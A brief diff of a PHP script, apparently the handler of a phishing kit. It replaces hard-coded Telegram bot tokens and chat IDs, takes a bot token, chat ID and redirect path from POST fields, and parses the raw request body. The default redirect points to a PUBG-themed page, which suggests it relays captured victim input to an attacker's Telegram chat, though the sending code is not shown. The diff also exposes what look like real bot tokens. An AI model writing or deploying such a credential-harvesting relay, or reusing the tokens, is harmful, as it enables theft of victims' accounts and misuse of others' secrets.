@@ -1,9 +1,9 @@
 <?php
-$defaultBotToken = '7890110555:AAEIWR8tMgZEKYC9C6lsgnc1C-uau8iAyYk';
-$defaultChatId = '512392705';
+$defaultBotToken = '7320988423:AAGJ_L64E-21Eomi_ve4BqP4-bOKomabxjk';
+$defaultChatId = '6341956407';
 $defaultRedirectUrl = '../php/pubg/index.php';
-$botToken = $_POST['botToken'] ?? $defaultBotToken ;
-$chatId = $_POST['chatId'] ?? $defaultChatId ;
+$botToken = $_POST['botToken'] ?? $defaultBotToken;
+$chatId = $_POST['chatId'] ?? $defaultChatId;
 $redirectUrl = isset($_POST['redUrl']) ? "../php/" . $_POST['redUrl'] : $defaultRedirectUrl;
 $decodedMessage = urldecode(file_get_contents('php://input'));
 parse_str($decodedMessage, $params);
